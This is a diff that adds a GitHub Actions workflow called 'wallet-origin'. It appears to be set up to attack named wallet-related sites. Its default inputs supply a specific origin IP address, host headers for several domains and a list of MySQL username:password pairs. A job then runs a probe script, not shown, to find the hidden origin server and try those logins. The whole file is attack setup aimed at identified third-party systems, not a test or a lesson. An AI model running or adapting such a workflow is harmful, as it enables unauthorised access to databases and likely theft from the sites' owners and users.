@@ -1,0 +1,26 @@
+name: wallet-origin
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'candidate origin ip'
+        required: false
+        default: '182.16.37.53'
+      hosts:
+        description: 'host headers to test'
+        required: false
+        default: 'new.walleto.top,admin.walleto.top,wallet.008dy.com'
+      mysqlcreds:
+        description: 'user:pass pairs comma-separated'
+        required: false
+        default: 'root:SmartAdmin666,root:vEgLK5N,root:,vEgLK5N:SmartAdmin666,admin:SmartAdmin666,wallet:SmartAdmin666'
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe origin
+        run: |
+          python3 -m pip install -q --break-system-packages PyMySQL 2>/dev/null || python3 -m pip install -q PyMySQL
+          python3 wallet_origin_probe.py --ip "${{ github.event.inputs.ip }}" --hosts "${{ github.event.inputs.hosts }}" --mysql-creds "${{ github.event.inputs.mysqlcreds }}"
